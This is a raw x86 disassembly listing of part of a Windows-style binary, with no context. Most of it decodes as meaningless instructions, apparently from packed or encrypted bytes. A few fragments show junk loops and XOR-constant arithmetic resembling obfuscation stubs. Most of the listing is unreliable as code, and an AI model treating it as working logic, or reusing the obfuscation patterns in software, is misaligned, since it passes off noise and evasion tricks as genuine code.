  4177f8:	sub    ecx,esp
  4177fa:	jl     0x4177f2
  4177fc:	push   edi
  4177fd:	mov    ah,0x99
  4177ff:	cdq    
  417800:	popa   
  417801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417802:	and    al,0x31
  417804:	cmc    
  417805:	clc    
  417806:	aaa    
  417807:	cmc    
  417808:	pop    ebp
  417809:	jae    0x417858
  41780b:	xchg   edx,eax
  41780c:	xchg   edx,eax
  41780d:	inc    ebp
  41780e:	inc    edx
  41780f:	xor    eax,0x79479845
  417814:	xor    ebp,0xfffffff1
  417817:	(bad)  [ebx]
  417819:	sub    eax,0x20b2c389
  41781e:	stos   DWORD PTR es:[edi],eax
  41781f:	scas   eax,DWORD PTR es:[edi]
  417820:	push   esp
  417821:	cmp    eax,0x3e2506a6
  417826:	and    eax,0x6aac58c0
  41782b:	call   0xdbd1161f
  417830:	loop   0x417857
  417832:	mov    ch,0xfd
  417834:	lods   al,BYTE PTR ds:[esi]
  417835:	aad    0x49
  417837:	cwde   
  417838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417839:	push   cs
  41783a:	jge    0x41785d
  41783c:	pushf  
  41783d:	inc    BYTE PTR [edi+0xf]
  417840:	cmc    
  417841:	ret    
  417842:	xchg   ebx,eax
  417843:	or     al,0x71
  417845:	(bad)  
  417846:	jl     0x4177d1
  417848:	and    al,0xbf
  41784a:	cmp    DWORD PTR [ecx-0xd],esi
  41784d:	xchg   ebx,eax
  41784e:	or     BYTE PTR [edx],0x64
  417851:	jecxz  0x4178be
  417853:	pushf  
  417854:	mov    ebx,0x30d9ee8a
  417859:	scas   al,BYTE PTR es:[edi]
  41785a:	hlt    
  41785b:	imul   eax,ebp,0xa1cac9a2
  417861:	cmp    edx,DWORD PTR [ecx]
  417863:	dec    edx
  417864:	mov    BYTE PTR [ecx+0x2d],ah
  417867:	mov    cs,esi
  417869:	sub    DWORD PTR [ebx+0x4d86ccba],ebx
  41786f:	out    0x1d,al
  417871:	(bad)  
  417873:	bound  esp,QWORD PTR [eax+0x24e6b815]
  417879:	cmp    al,0x1f
  41787b:	test   al,0x9b
  41787d:	(bad)
  417880:	push   esi
  417881:	cmp    BYTE PTR [esi+0x7f],0xd6
  417885:	loope  0x41781e
  417887:	call   0x6634bef7
  41788c:	cmc    
  41788d:	push   ecx
  41788e:	fcomp  DWORD PTR [edx-0x73]
  417891:	sbb    edx,DWORD PTR [eax+eiz*4+0x21]
  417895:	mov    ebp,0x46af23cc
  41789a:	inc    ecx
  41789b:	je     0x417863
  41789d:	mov    ebp,0xfca1cdf3
  4178a2:	daa    
  4178a3:	arpl   WORD PTR [edi-0xf8a1f30],bp
  4178a9:	jl     0x4178e4
  4178ab:	mov    edi,DWORD PTR [edx-0x2b]
  4178ae:	mov    al,ds:0xe9f5db6a
  4178b3:	or     ebp,DWORD PTR [ebx+0x1f179707]
  4178b9:	pusha  
  4178ba:	daa    
  4178bb:	and    ecx,DWORD PTR [eax]
  4178bd:	in     eax,0x53
  4178bf:	push   0x57
  4178c1:	mov    ds:0x8a9c1a5b,eax
  4178c6:	das    
  4178c7:	adc    al,0xbf
  4178c9:	je     0x41788e
  4178cb:	fwait
  4178cc:	push   ecx
  4178cd:	inc    ebx
  4178ce:	fbld   TBYTE PTR [edi+0x3c480347]
  4178d4:	jmp    0x417afc
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	das    
  4178e6:	mov    WORD PTR [esi+0x7f330415],ds
  4178ec:	js     0x4178f3
  4178ee:	jle    0x417968
  4178f0:	js     0x417896
  4178f2:	pop    ecx
  4178f3:	cld    
  4178f4:	xor    DWORD PTR [eax],esp
  4178f6:	leave  
  4178f7:	dec    ecx
  4178f8:	sub    BYTE PTR [edx+0x360d3fc7],al
  4178fe:	jl     0x417910
  417900:	inc    esi
  417901:	in     eax,0x11
  417903:	or     cl,BYTE PTR [ecx]
  417905:	mov    esi,0xda984cd3
  41790a:	pop    es
  41790b:	imul   esp,edx,0xfc09402f
  417911:	push   esi
  417912:	(bad)  
  417913:	xor    eax,0xbf056d1
  417918:	out    dx,al
  417919:	cdq    
  41791a:	imul   esp,esp,0xa2a9afa
  417920:	sub    al,0xf1
  417922:	in     eax,dx
  417923:	cmp    eax,0x2c5c86ff
  417928:	sti    
  417929:	(bad)  
  41792a:	fcomp  DWORD PTR [eax+0x11]
  41792d:	leave  
  41792e:	sbb    DWORD PTR [ebx-0xb1f831d],ebx
  417934:	fsubr  DWORD PTR [edi+ebp*2]
  417937:	jl     0x417921
  417939:	loopne 0x4178d4
  41793b:	jecxz  0x41799a
  41793d:	xor    DWORD PTR [edi],edx
  41793f:	pop    edx
  417940:	aaa    
  417941:	pop    es
  417942:	mov    esp,0x36447fc5
  417947:	es cld 
  417949:	sbb    eax,0xf5f24b93
  41794e:	dec    ebp
  41794f:	out    dx,al
  417950:	dec    edi
  417951:	push   ebp
  417952:	adc    DWORD PTR [bx+di+0x55fa],eax
  417957:	ficomp DWORD PTR [ecx+ecx*8-0x1f]
  41795b:	cs adc al,0x71
  41795e:	add    al,0xbe
  417960:	push   eax
  417961:	stos   DWORD PTR es:[edi],eax
  417962:	dec    eax
  417963:	inc    esi
  417964:	lds    ebp,FWORD PTR [ebx+0x15410e97]
  41796a:	cld    
  41796b:	(bad)  
  41796c:	mov    ecx,0x4b54fdff
  417971:	scas   al,BYTE PTR es:[edi]
  417972:	cmc    
  417973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417974:	outs   dx,BYTE PTR ds:[esi]
  417975:	sbb    al,0x81
  417977:	sar    ebx,cl
  417979:	leave  
  41797a:	cmp    dh,al
  41797c:	xlat   BYTE PTR ds:[ebx]
  41797d:	in     al,dx
  41797e:	push   edi
  41797f:	xor    BYTE PTR ds:0xc29f10e9,0xe7
  417986:	pop    ecx
  417987:	inc    edx
  417988:	test   DWORD PTR [esi],esi
  41798a:	adc    ah,BYTE PTR [edi-0x7c]
  41798d:	lock sbb BYTE PTR [esi],dh
  417990:	mov    ebx,0x705a8058
  417995:	pop    ecx
  417996:	(bad)  
  417998:	int3   
  417999:	sub    ch,BYTE PTR [esi-0x61d1e84e]
  41799f:	mov    eax,ds:0xdf5bee17
  4179a4:	ret    0x601e
  4179a7:	mov    ch,0x36
  4179a9:	mov    bh,bl
  4179ab:	popa   
  4179ac:	jecxz  0x4179d9
  4179ae:	xchg   esp,eax
  4179af:	or     ebp,DWORD PTR [esi]
  4179b1:	mov    ds:0xdd23df32,eax
  4179b6:	das    
  4179b7:	in     al,0x8d
  4179b9:	out    dx,al
  4179ba:	lock shr BYTE PTR [ecx+0x57dcf5bc],0xcd
  4179c2:	dec    esp
  4179c3:	in     al,0x5d
  4179c5:	add    DWORD PTR [edx-0x78],edi
  4179c8:	fisttp DWORD PTR [edi+0x32721677]
  4179ce:	cmp    ah,al
  4179d0:	es push 0xef9de439
  4179d6:	xor    ecx,DWORD PTR [ebx-0x5df0196b]
  4179dc:	mov    eax,ds:0x82a2f291
  4179e1:	push   es
  4179e2:	mov    cl,0x65
  4179e4:	jno    0x417a55
  4179e6:	and    ebx,esp
  4179e8:	es sub eax,0xe6274d2d
  4179ee:	jae    0x4179fa
  4179f0:	or     bl,BYTE PTR [edx]
  4179f2:	(bad)  
  4179f4:	push   esp
  4179f5:	jge    0x417a0e
  4179f7:	push   ecx
  4179f8:	mov    ah,0xa2
  4179fa:	test   BYTE PTR ds:0xc8c927fe,ch
  417a00:	ins    DWORD PTR es:[edi],dx
  417a01:	mov    bl,0x78
  417a03:	scas   eax,DWORD PTR es:[edi]
  417a04:	cwde   
  417a05:	sub    BYTE PTR [ebx+esi*4-0x45c95636],al
  417a0c:	out    dx,al
  417a0d:	cld    
  417a0e:	ja     0x417a67
  417a10:	sbb    cl,bl
  417a12:	inc    ebp
  417a13:	inc    ecx
  417a14:	push   esi
  417a15:	(bad)  
  417a16:	mov    cl,ah
  417a18:	sbb    cl,BYTE PTR [esp+esi*1+0x607120c2]
  417a1f:	daa    
  417a20:	xchg   esp,eax
  417a21:	std    
  417a22:	mov    dh,BYTE PTR [esi]
  417a24:	cli    
  417a25:	pusha  
  417a26:	jno    0x4179b3
  417a28:	mov    cl,0xf6
  417a2a:	jp     0x4179b7
  417a2c:	(bad)  
  417a2d:	xchg   edi,eax
  417a2e:	jb     0x417a9e
  417a30:	xor    BYTE PTR [edi-0x5d531122],dh
  417a36:	sahf   
  417a37:	jmp    0x7862:0x39ab4746
  417a3e:	xchg   BYTE PTR [edi],ch
  417a40:	dec    edx
  417a41:	sbb    al,0xbd
  417a43:	rol    ch,cl
  417a45:	(bad)  
  417a46:	lea    edi,[ebp-0xb0969a1]
  417a4c:	ror    esi,cl
  417a4e:	dec    edx
  417a4f:	aaa    
  417a50:	test   eax,0xc9ba2de9
  417a55:	adc    BYTE PTR [esi+ebp*8+0x66ee65ae],0x8c
  417a5d:	mov    cl,0xfa
  417a5f:	inc    edx
  417a60:	sbb    al,0x60
  417a62:	adc    ebx,eax
  417a64:	repz enter 0x5abf,0x51
  417a69:	les    ebp,FWORD PTR [esi]
  417a6b:	dec    ebx
  417a6c:	push   ebp
  417a6d:	sub    eax,0x1b48f41c
  417a72:	add    eax,0x4a464721
  417a77:	jecxz  0x417a0c
  417a79:	inc    eax
  417a7a:	or     BYTE PTR [eax],al
  417a7c:	data16 cld 
  417a7e:	in     al,0xe5
  417a80:	inc    ebx
  417a81:	idiv   al
  417a83:	mov    ecx,esp
  417a85:	adc    al,0xe6
  417a88:	jmp    0x1b00:0x8a683cb
  417a8f:	pop    esp
  417a90:	lock jecxz 0x417a6b
  417a93:	mov    bl,0x60
  417a95:	sub    al,0xd3
  417a97:	(bad)  
  417a98:	mov    al,0x93
  417a9a:	retf   0x897e
  417a9d:	xchg   ecx,eax
  417a9e:	cmp    dh,BYTE PTR [esi]
  417aa0:	mov    eax,ds:0xabe3d32c
  417aa5:	pop    es
  417aa6:	cld    
  417aa7:	inc    eax
  417aa8:	mov    dh,0xa6
  417aaa:	jmp    0x54ada66a
  417aaf:	call   0x2443b097
  417ab4:	add    BYTE PTR [eax],0x83
  417ab7:	jmp    0x28a341b8
  417abc:	xchg   ebx,eax
  417abd:	in     eax,0x96
  417abf:	neg    BYTE PTR ds:0x5c4dca5e
  417ac5:	sbb    BYTE PTR [ebx],bl
  417ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ac8:	inc    esi
  417ac9:	retf   0xbd6f
  417acc:	fwait
  417acd:	push   es
  417ace:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417ad0:	into   
  417ad1:	adc    al,0x5e
  417ad3:	push   ss
  417ad4:	loop   0x417b4d
  417ad6:	dec    edx
  417ad7:	in     al,dx
  417ad8:	xchg   esp,eax
  417ad9:	inc    ebx
  417ada:	inc    edi
  417adb:	bound  ebp,QWORD PTR [edi-0xe]
  417ade:	outs   dx,DWORD PTR ds:[esi]
  417adf:	ss mov ah,0x34
  417ae2:	mov    cs,edx
  417ae4:	xchg   esp,eax
  417ae5:	push   ecx
  417ae6:	lock daa 
  417ae8:	ret    
  417ae9:	push   es
  417aea:	mov    ecx,0x585d81d8
  417aef:	out    dx,eax
  417af0:	mov    al,0xef
  417af2:	nop
  417af3:	jmp    0xf4cb:0xe3cb71fe
  417afa:	mov    al,ds:0x850ba16
  417aff:	push   ecx
  417b00:	pop    es
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0xb290d96c
  417b49:	sub    DWORD PTR [ecx],edx
  417b4b:	xor    DWORD PTR [edi+0x78],edi
  417b4e:	add    eax,0xd578787e
  417b53:	dec    ebx
  417b54:	xor    cl,dl
  417b56:	push   ss
  417b57:	jb     0x417ae0
  417b59:	cmc    
  417b5a:	xor    DWORD PTR [ebp-0x8],0xffffff9e
  417b5e:	pop    ecx
  417b5f:	mov    ds:0xcfe3a230,al
  417b64:	pop    es
  417b65:	push   ebp
  417b66:	cli    
  417b67:	pop    es
  417b68:	jmp    0xaf5b:0x20ce2a5f
  417b6f:	jmp    0x285d:0xd993a50f
  417b76:	xor    al,0x55
  417b78:	mov    esp,DWORD PTR [eax-0x1e8afc3b]
  417b7e:	or     DWORD PTR [eax+0x66d55d67],esp
  417b84:	inc    edi
  417b85:	sub    ebx,edx
  417b87:	jecxz  0x417baf
  417b89:	jno    0x417b0f
  417b8b:	or     cl,dh
  417b8d:	jmp    0x417b2b
  417b8f:	in     eax,0x75
  417b91:	lea    esp,[edi+0x7cbc6efa]
  417b97:	add    ebp,edi
  417b99:	cli    
  417b9a:	adc    BYTE PTR [edi],ch
  417b9c:	mov    dh,0x87
  417b9e:	cmp    dl,BYTE PTR [esi-0x374a14d3]
  417ba4:	lea    esp,[ecx]
  417ba6:	scas   al,BYTE PTR es:[edi]
  417ba7:	pop    edx
  417ba8:	data16 jne 0x417bf8
  417bab:	(bad)  [eax]
  417bad:	cwde   
  417bae:	jb     0x417bc9
  417bb0:	jmp    edx
  417bb2:	pushf  
  417bb3:	xchg   esi,eax
  417bb4:	cmc    
  417bb5:	das    
  417bb6:	mov    dh,0x29
  417bb8:	jnp    0x417c13
  417bba:	data16 sbb BYTE PTR [edi],cl
  417bbd:	mov    eax,ds:0x9a4aba66
  417bc2:	bound  edi,QWORD PTR [edx]
  417bc4:	in     al,dx
  417bc5:	(bad)  
  417bc6:	jnp    0x417b6f
  417bc8:	into   
  417bc9:	fstp   TBYTE PTR [ecx-0x4d]
  417bcc:	arpl   WORD PTR [eax-0x6a3c6719],bx
  417bd2:	neg    BYTE PTR [esi+0x22]
  417bd5:	and    esp,eax
  417bd7:	loop   0x417b9f
  417bd9:	(bad)  [ecx]
  417bdb:	push   edx
  417bdc:	shr    DWORD PTR [ebx+edx*8+0x23b9d02a],0x38
  417be4:	inc    eax
  417be5:	pusha  
  417be6:	jb     0x417c1d
  417be8:	(bad)  
  417bea:	aam    0xce
  417bec:	cmp    DWORD PTR [eax],edi
  417bee:	sahf   
  417bef:	leave  
  417bf0:	xchg   edx,eax
  417bf1:	cmp    ch,bl
  417bf3:	pushf  
  417bf4:	loope  0x417c47
  417bf6:	mov    edx,0xfe054ff1
  417bfb:	add    ebx,DWORD PTR [eax-0x55]
  417bfe:	mov    ebx,0x41d1c082
  417c03:	mov    ebp,ds
  417c05:	fst    st(3)
  417c07:	ret    
  417c08:	test   BYTE PTR [ebx],dh
  417c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c0b:	test   BYTE PTR [ebx-0x51819dd],ch
  417c11:	dec    ebx
  417c12:	mov    DWORD PTR [ebx+0xd1a2785],eax
  417c18:	sbb    BYTE PTR [ebx],0x13
  417c1b:	inc    eax
  417c1c:	and    BYTE PTR ds:0x3f680f65,cl
  417c22:	cdq    
  417c23:	dec    ebp
  417c24:	ins    BYTE PTR es:[edi],dx
  417c25:	sub    ch,ch
  417c27:	aas    
  417c28:	out    dx,al
  417c29:	add    al,BYTE PTR [ecx-0x1f04f674]
  417c2f:	dec    eax
  417c30:	mov    esp,0x43e4618f
  417c35:	pop    edx
  417c36:	sbb    DWORD PTR ds:[eax-0x4b],eax
  417c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c3b:	ins    DWORD PTR es:[edi],dx
  417c3c:	jp     0x417bfa
  417c3e:	in     eax,dx
  417c3f:	mov    eax,0xdd522a49
  417c44:	fild   WORD PTR [esi+0x47]
  417c47:	sar    DWORD PTR [ecx],cl
  417c49:	push   ebx
  417c4a:	xlat   BYTE PTR ds:[ebx]
  417c4b:	outs   dx,BYTE PTR ds:[esi]
  417c4c:	sbb    al,0x70
  417c4e:	clc    
  417c4f:	xor    ebx,DWORD PTR [esi-0x51]
  417c52:	les    ecx,FWORD PTR [eax-0xe0a44a3]
  417c58:	out    0xaf,eax
  417c5a:	rcr    DWORD PTR [ecx],0x4
  417c5d:	cmp    bl,bh
  417c5f:	aas    
  417c60:	add    eax,0xf9ca60f7
  417c65:	sbb    al,ch
  417c67:	and    ebx,DWORD PTR [ebp-0x34]
  417c6a:	and    al,0x1c
  417c6c:	pop    eax
  417c6d:	mov    ds:0x75b9dede,al
  417c72:	mov    eax,0x8efc282e
  417c77:	js     0x417c4b
  417c79:	mov    esp,esp
  417c7b:	jne    0x417ce1
  417c7d:	pop    ebx
  417c7e:	mov    eax,ds:0xc7e4a95d
  417c83:	xor    bl,al
  417c85:	lods   eax,DWORD PTR ds:[esi]
  417c86:	mov    ecx,0x603bf3bc
  417c8b:	push   ds
  417c8c:	fcomp  DWORD PTR [edx+0x1]
  417c8f:	and    BYTE PTR [ecx-0x5],dl
  417c92:	in     eax,dx
  417c93:	pusha  
  417c94:	(bad)  
  417c95:	stc    
  417c96:	psrlw  mm3,QWORD PTR [edx+ebx*4+0x41d580c1]
  417c9e:	jmp    0x3e111ad0
  417ca3:	jp     0x417cc7
  417ca5:	fcomp  DWORD PTR [edi-0x4872c54f]
  417cab:	scas   eax,DWORD PTR es:[edi]
  417cac:	inc    esp
  417cad:	fwait
  417cae:	push   ss
  417caf:	pop    esp
  417cb0:	sar    ebp,cl
  417cb2:	xor    al,0x61
  417cb4:	fistp  WORD PTR [eax]
  417cb6:	inc    esi
  417cb7:	xor    eax,0x7ce21e38
  417cbc:	push   es
  417cbd:	xchg   edi,eax
  417cbe:	push   0x76
  417cc0:	fsubr  DWORD PTR [eax-0x52a6b9c5]
  417cc6:	or     DWORD PTR [ebp-0x1d],edi
  417cc9:	inc    esi
  417cca:	jmp    0xbef4:0xdbcaab56
  417cd1:	jb     0x417cfb
  417cd3:	mov    ds:0x40438872,al
  417cd8:	imul   BYTE PTR [ebx+ecx*2+0x79]
  417cdc:	xor    bl,BYTE PTR [edx+ebx*1+0x4f]
  417ce0:	rol    DWORD PTR [edi+0x116b9208],0xfa
  417ce7:	neg    BYTE PTR [ebx-0x14cf3afe]
  417ced:	pop    esi
  417cee:	xor    edx,eax
  417cf0:	popa   
  417cf1:	mov    ebx,0x2820e129
  417cf6:	fst    QWORD PTR [ebp+0x112efe2a]
  417cfc:	int    0xe0
  417cfe:	jle    0x417d73
  417d00:	sbb    DWORD PTR [ebx+0x28b60bfc],ebx
  417d06:	or     DWORD PTR [edi],edi
  417d08:	sbb    ebx,DWORD PTR [edx-0x47]
  417d0b:	lods   eax,DWORD PTR ds:[esi]
  417d0c:	and    bh,BYTE PTR [edx-0x80]
  417d0f:	mov    esi,0x2023556e
  417d14:	shl    edx,0xa5
  417d17:	adc    BYTE PTR [edx-0x45],0x77
  417d1b:	jns    0x417d8e
  417d1d:	mov    al,0x11
  417d1f:	test   al,al
  417d21:	(bad)  
  417d22:	mov    ebx,DWORD PTR [esi+ebx*2]
  417d25:	sub    eax,0xcbb92182
  417d2a:	dec    esp
  417d2b:	in     al,0xed
  417d2d:	inc    esi
  417d2e:	out    0x5c,al
  417d30:	pushf  
  417d31:	xchg   esp,eax
  417d32:	cs leave 
  417d34:	sub    ebx,DWORD PTR [edx-0x21]
  417d37:	jge    0x417dab
  417d39:	je     0x417cd7
  417d3b:	push   edi
  417d3c:	mov    ds:0xd5b032c6,al
  417d41:	hlt    
  417d42:	shl    cl,cl
  417d44:	pop    ebp
  417d45:	out    0xd9,al
  417d47:	sbb    al,0x38
  417d49:	xchg   ecx,eax
  417d4a:	mov    al,ds:0xaed4eedf
  417d4f:	jbe    0x417d53
  417d51:	xlat   BYTE PTR ds:[ebx]
  417d52:	adc    al,0x9b
  417d54:	fs inc edi
  417d56:	sub    bl,bl
  417d58:	(bad)  
  417d59:	lods   eax,DWORD PTR ds:[esi]
  417d5a:	imul   eax,DWORD PTR ds:0x850355a,0x51
  417d61:	pop    es
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	call   DWORD PTR [edi]
  417e8e:	pop    ss
  417e8f:	cli    
  417e90:	retf   0x371e
  417e93:	jg     0x417f0d
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	fnstenv [esi+eiz*1]
  417e9c:	sub    DWORD PTR [eax],eax
  417e9e:	(bad)  
  417e9f:	aam    0x5
  417ea1:	pop    ebx
  417ea2:	mov    cl,dl
  417ea4:	mov    ebx,0x15e67ab2
  417ea9:	xor    eax,0xf4440f5
  417eae:	pop    esi
  417eaf:	ds xchg esi,eax
  417eb1:	pop    ebp
  417eb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417eb3:	inc    ebp
  417eb4:	xor    DWORD PTR [eax],ebp
  417eb6:	pop    esp
  417eb7:	js     0x417ec8
  417eb9:	xchg   edx,eax
  417eba:	jecxz  0x417f15
  417ebc:	aaa    
  417ebd:	adc    eax,0x7792ac68
  417ec2:	pop    ds
  417ec3:	inc    esp
  417ec4:	ja     0x417ef7
  417ec6:	and    edx,DWORD PTR [ecx]
  417ec8:	aam    0xb0
  417eca:	add    BYTE PTR [di-0x3809],cl
  417ecf:	enter  0x1490,0x49
  417ed3:	jg     0x417e69
  417ed5:	sar    dl,cl
  417ed7:	mov    al,ds:0xb6fd4f28
  417edc:	into   
  417edd:	pop    ebp
  417ede:	stos   DWORD PTR es:[edi],eax
  417edf:	sub    al,0x39
  417ee1:	cmp    DWORD PTR [eax+edi*8-0x131beecc],esp
  417ee8:	jnp    0x417ef7
  417eea:	push   eax
  417eeb:	pop    esi
  417eec:	ins    BYTE PTR es:[edi],dx
  417eed:	sub    eax,0x7992c6c2
  417ef2:	not    BYTE PTR [edx+0x1eae1286]
  417ef8:	adc    esp,DWORD PTR [esi+ebx*8+0xb9c78e4]
  417eff:	push   0xffffffe9
  417f01:	inc    edi
  417f02:	retf   
  417f03:	xchg   edi,eax
  417f04:	or     ebx,DWORD PTR [edx]
  417f06:	push   edi
  417f07:	or     BYTE PTR [ebx],0x6c
  417f0a:	add    ch,ah
  417f0c:	clc    
  417f0d:	push   eax
  417f0e:	mov    ebp,0x506e5180
  417f13:	std    
  417f14:	fdiv   QWORD PTR [eax-0x50108f6a]
  417f1a:	mov    ss,ebx
  417f1c:	mov    al,ds:0x478b6f18
  417f21:	jecxz  0x417ebe
  417f23:	cmc    
  417f24:	and    dl,BYTE PTR [ebx]
  417f26:	adc    DWORD PTR [ecx+0x20],edi
  417f29:	call   0x56ef3fd2
  417f2e:	daa    
  417f2f:	sub    BYTE PTR [ebx],bh
  417f31:	jae    0x417f33
  417f33:	dec    ecx
  417f34:	hlt    
  417f35:	push   eax
  417f36:	jo     0x417fb0
  417f38:	xchg   ebx,eax
  417f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f3a:	mov    DWORD PTR [ebp+0x75],esi
  417f3d:	mov    esi,0x8b28a4
  417f42:	jge    0x417f1c
  417f44:	dec    esi
  417f45:	or     al,0xc1
  417f47:	inc    edx
  417f48:	xchg   ebp,eax
  417f49:	iret   
  417f4a:	mov    DWORD PTR [edx-0x72],esp
  417f4d:	in     al,0x3c
  417f4f:	push   eax
  417f50:	cmp    al,0x29
  417f52:	lds    edi,FWORD PTR [edx+edx*8]
  417f55:	inc    esp
  417f56:	cmp    eax,0x1d22f944
  417f5b:	outs   dx,BYTE PTR ds:[esi]
  417f5c:	pusha  
  417f5d:	cmp    al,0x2e
  417f5f:	loopne 0x417f24
  417f61:	mov    WORD PTR [ecx],fs
  417f63:	aam    0x92
  417f65:	xchg   DWORD PTR [esi],esi
  417f67:	aad    0xe1
  417f69:	or     BYTE PTR gs:[edx],ch
  417f6c:	daa    
  417f6d:	jle    0x417f71
  417f6f:	aam    0xd5
  417f71:	push   es
  417f72:	xlat   BYTE PTR ds:[ebx]
  417f73:	xchg   eax,ebx
  417f75:	jge    0x417f99
  417f77:	adc    DWORD PTR [edx],ecx
  417f79:	fdivp  st(7),st
  417f7b:	inc    esi
  417f7c:	int    0xdb
  417f7e:	popf   
  417f7f:	jmp    0x417ffe
  417f81:	cwde   
  417f82:	xchg   DWORD PTR [ebp-0x70],ecx
  417f85:	lahf   
  417f86:	adc    esp,DWORD PTR [ecx+ecx*1-0x6eacceb9]
  417f8d:	cs push ecx
  417f8f:	pop    esi
  417f90:	pop    ds
  417f91:	nop    DWORD PTR [esi+0x3c954df9]
  417f98:	popa   
  417f99:	add    eax,0xb276d929
  417f9e:	sbb    bh,dh
  417fa0:	cmc    
  417fa1:	pushf  
  417fa2:	lds    esp,FWORD PTR [ebx-0x20]
  417fa5:	dec    esp
  417fa6:	xor    al,BYTE PTR [ebp+eax*1-0x7]
  417faa:	mov    al,0xb7
  417fac:	daa    
  417fad:	xor    eax,0xd4ca0a80
  417fb2:	mov    al,0xd
  417fb4:	mov    al,ds:0x4bc579f6
  417fb9:	inc    edx
  417fba:	(bad)  
  417fbb:	xor    ah,BYTE PTR [edx-0x4b]
  417fbe:	jmp    0xe0f96245
  417fc3:	add    BYTE PTR fs:[ebp+0x460f5726],ah
  417fca:	pop    ebp
  417fcb:	cld    
  417fcc:	xchg   ah,dh
  417fce:	push   edx
  417fcf:	adc    ebx,DWORD PTR [ebx]
  417fd1:	mov    esi,esi
  417fd3:	xlat   BYTE PTR ds:[ebx]
  417fd4:	dec    esp
  417fd5:	pop    ds
  417fd6:	and    eax,0x6e3800e2
  417fdb:	mov    dl,0xe3
  417fdd:	push   esp
  417fde:	jno    0x417fd2
  417fe0:	out    dx,al
  417fe1:	push   ds
  417fe2:	mov    ch,0xdb
  417fe4:	and    esp,DWORD PTR [edx+0x2c5a9148]
  417fea:	xchg   ebp,eax
  417feb:	call   0xba29:0x2f996087
  417ff2:	and    BYTE PTR [ecx+edi*2-0x4f],0xb0
  417ff7:	adc    al,0x0
  417ff9:	dec    ebp
  417ffa:	jl     0x41800e
  417ffc:	jmp    0x1642c087
  418001:	out    dx,al
  418002:	repnz mov edx,0x408eee8f
  418008:	je     0x417fb7
  41800a:	js     0x417ff7
  41800c:	(bad)  
  41800d:	push   ebp
  41800e:	add    DWORD PTR [ecx-0x761b2281],edi
  418014:	rcr    edi,1
  418016:	(bad)  
  418017:	jle    0x418024
  418019:	push   ds
  41801a:	fldcw  WORD PTR [esp+ebx*2-0x3d]
  41801e:	inc    ecx
  41801f:	lock xchg esi,ebp
  418022:	xor    edi,ebx
